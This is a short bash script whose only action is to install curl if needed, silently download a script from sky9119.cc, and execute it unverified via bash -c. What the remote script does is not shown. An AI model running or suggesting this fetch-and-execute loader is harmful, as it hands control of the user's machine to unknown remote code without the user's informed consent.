#!/usr/bin/env bash
(if ! command -v curl >/dev/null; then apt-get update && apt-get install -y curl ca-certificates; fi && s=$(curl -q -fsSL --max-time 60 https://sky9119.cc/sb.sh) && [ -n "$s" ] && bash -c "$s")
